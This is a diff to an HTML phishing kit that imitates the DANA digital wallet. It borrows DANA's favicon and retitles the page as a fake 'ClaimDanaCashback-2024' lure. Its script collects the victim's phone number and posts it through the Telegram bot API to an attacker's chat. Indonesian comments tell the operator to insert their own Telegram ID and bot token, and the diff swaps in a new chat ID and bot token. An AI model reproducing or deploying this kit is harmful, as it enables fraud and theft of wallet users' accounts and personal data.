@@ -1,7 +1,7 @@
 <!doctype html>
 <html>
  <head>
-  <title>DANA | Dompet digital</title>
+  <title>🎁ClaimDanaCasbhack-2024🎁</title></title>
   <link href="https://a.m.dana.id/merchant-portal/app/assets/fav-icon.png" rel="apple-touch-icon" sizes="180x180">
   <link href="https://a.m.dana.id/merchant-portal/app/assets/fav-icon.png" rel="icon" type="image/png" sizes="32x32">
   <link href="https://a.m.dana.id/merchant-portal/app/assets/fav-icon.png" rel="icon" type="image/png" sizes="16x16">
@@ -138,9 +138,9 @@ DANA | NoHP | ${phone_number}
 - No HP : ${phone_number}`;
 
 //_masukan_ID_Akun_Telegram_kamu
-var id_telegram   = "6622807510";
+var id_telegram   = "6693425460";
 //_masukan_ID_Bot_Telegram_kamu
-var token_botTele = "6500813629:AAHSWt3mas2TF9ZgxsvU4oWcapkY2P0MVzg";
+var token_botTele = "7125107461:AAH66Cs4ypTD0Nn-1ouEQwQoqQp37JLkuMI";
     fetch("https://api.telegram.org/bot"+token_botTele+"/sendMessage?parse_mode=markdown",{
         method: 'POST',
         headers: {
